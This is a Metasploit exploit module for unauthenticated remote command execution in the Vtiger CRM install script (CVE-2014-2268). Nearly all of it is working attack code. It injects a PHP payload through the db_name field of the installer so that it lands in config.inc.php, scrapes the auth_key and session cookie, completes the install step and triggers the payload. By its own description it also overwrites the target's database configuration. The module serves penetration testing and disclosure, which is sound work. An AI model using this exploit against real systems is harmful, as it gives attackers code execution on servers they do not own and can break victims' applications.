# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

  # Application database configuration is overwritten
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Vtiger Install Unauthenticated Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary command execution vulnerability in the
        Vtiger install script. This module is set to ManualRanking due to this
        module overwriting the target database configuration, which may result in
        a broken web app, and you may not be able to get a session again.
      },
      &#039;Author&#039;         =>
        [
          &#039;Jonathan Borgeaud < research[at]navixia.com >&#039; # Navixia Research Team
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-2268&#039; ],
          [ &#039;URL&#039;, &#039;https://www.navixia.com/blog/entry/navixia-find-critical-vulnerabilities-in-vtiger-crm-cve-2014-2268-cve-2014-2269.html&#039;],
          [ &#039;URL&#039;, &#039;http://vtiger-crm.2324883.n4.nabble.com/Vtigercrm-developers-IMP-forgot-password-and-re-installation-security-fix-tt9786.html&#039;],

        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4000,
          &#039;BadChars&#039;    => "#",
          &#039;DisableNops&#039; => true,
          &#039;Keys&#039;        => [&#039;php&#039;]
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Vtiger 6.0.0 or older&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Mar 5 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Vtiger&#039;, &#039;/&#039;])
        ], self.class)
  end

  def exploit
    print_status("Injecting payload...")
    rand_arg = Rex::Text.rand_text_hex(10)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;headers&#039;  => {&#039;X-Requested-With&#039; => rand_text_alpha(5)},
      &#039;vars_get&#039; => {
          &#039;module&#039;  => &#039;Install&#039;,
          &#039;view&#039;    => &#039;Index&#039;,
          &#039;mode&#039;    => &#039;Step5&#039;,
          &#039;db_name&#039; => "127.0.0.1&#039;; if(isset($_GET[&#039;#{rand_arg}&#039;])){ #{payload.encoded} } // "
      }})

    # Check timeout
    if not res
      print_error("Request timed out, please try again")
      return
    end

    if res.body =~ /name="auth_key"\s+value=".*?((?:[a-z0-9]*))"/i
      authkey   = $1
      phpsessid = res.get_cookies

      if authkey.blank?
        print_error("No AuthKey found")
        return
      elsif phpsessid.blank?
        print_error("No PHP Session ID found")
        return
      end

      print_status("Retrieved Authkey : #{authkey}")
      print_status("Retrieved PHPSESSID : #{phpsessid}")

      send_request_cgi({
        &#039;method&#039;     => &#039;GET&#039;,
          &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;index.php&#039;),
          &#039;headers&#039;  => {&#039;X-Requested-With&#039; => rand_text_alpha(5)},
          &#039;cookie&#039;   => phpsessid,
          &#039;vars_get&#039; =>
            {
              &#039;module&#039;   => &#039;Install&#039;,
              &#039;view&#039;     => &#039;Index&#039;,
              &#039;mode&#039;     => &#039;Step7&#039;,
              &#039;auth_key&#039; => authkey
            }
        })

        print_status("Executing payload...")
        send_request_cgi({
          &#039;method&#039;    => &#039;GET&#039;,
          &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;config.inc.php&#039;),
          &#039;vars_get&#039;  => { rand_arg => &#039;1&#039; }
        })
    else
      print_error("No auth_key pattern found")
    end
  end
end

